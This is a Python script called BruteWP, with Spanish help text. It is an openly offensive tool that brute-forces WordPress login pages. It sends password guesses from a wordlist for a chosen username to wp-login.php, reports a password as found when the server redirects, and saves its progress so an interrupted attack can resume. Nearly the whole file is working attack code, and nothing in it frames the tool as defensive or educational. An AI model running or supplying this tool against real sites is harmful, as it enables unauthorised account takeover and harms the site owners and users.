#!/usr/bin/python
#-*- coding:UTF-8 -*-
import argparse
import httplib
import urllib
import socket
import time

def attack(target,user,wordlist, restore = None):
    i= target.find("/")
    site = target[:i]
    post = target[i:]
    iteracion = open('iteracion.txt','a+')
    wordlist = open(wordlist, 'r+')
    it = iteracion.readlines()
    if len(it) == 0:
        iteracion.write("1\n")
        iteracion.close()
        iteracion = open('iteracion.txt','r+')
        it = iteracion.readlines()
    it2= int(str(it[len(it)-1]).strip())
    aux = wordlist.readlines()
    test = aux[it2-1:]
    cont = it2
    if restore:
		print "Restaurando ataque...\n"
    else:
        test = aux
        cont=1
        iteracion = open('iteracion.txt','w+')
    for password in test:
        try:
            cabeceras = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}
            parametros = urllib.urlencode({'log': user,'pwd':password.strip()})
            abrir_conexion = httplib.HTTPConnection(site)
            abrir_conexion.request("POST", post, parametros, cabeceras)
            respuesta = abrir_conexion.getresponse()
            if respuesta.status == 302 or respuesta.status == 303:
                print '%d- Password: %s FOUND!!!' %(cont,password.strip())
                break
            elif respuesta.status == 200:
                print '%d- Password: %s Not found!!!' %(cont,password.strip())
            else:
                print 'ERROR!!!!'
            cont+=1
            abrir_conexion.close()
        except KeyboardInterrupt:
            print '\n[*]Ejecución terminada por el teclado[*]'
            print '[*]Status saved![*]'
            iteracion.write(str(cont)+"\n")
            break
        except (socket.gaierror, socket.error,httplib.BadStatusLine):
            print '[*]Status saved![*]'
            iteracion.write(str(cont)+'\n')
            time.sleep(5)
            continue


def conexion():
    parser = argparse.ArgumentParser(usage="./BruteWP.py -t [target] -u [user] -w [wordlist]")
    parser.add_argument("-t", help="Target a atacar. ejemplo: www.sitewordpress/wp-login.php")
    parser.add_argument("-u", help="Nombre de usuario de WordPress")
    parser.add_argument("-w", help="Diccionario para realizar el ataque")
    parser.add_argument("-r", action="store_true", help="Restaura la última sesión del ataque")
    args = parser.parse_args()
    
    print """
 ____             _     __        ______  
| __ ) _ __ _   _| |_ __\ \      / /  _ \ 
|  _ \| '__| | | | __/ _ \ \ /\ / /| |_) |
| |_) | |  | |_| | ||  __/\ V  V / |  __/ 
|____/|_|   \__,_|\__\___| \_/\_/  |_|    
                                        v 1.1
    """
    if args.u != None and args.w != None and args.t != None and args.r:
        attack(args.t,args.u,args.w, True)
    elif args.u != None and args.w != None and args.t != None:
        attack(args.t,args.u,args.w)
    else:
        parser.print_help()
    


if __name__ == '__main__':
    conexion()
    
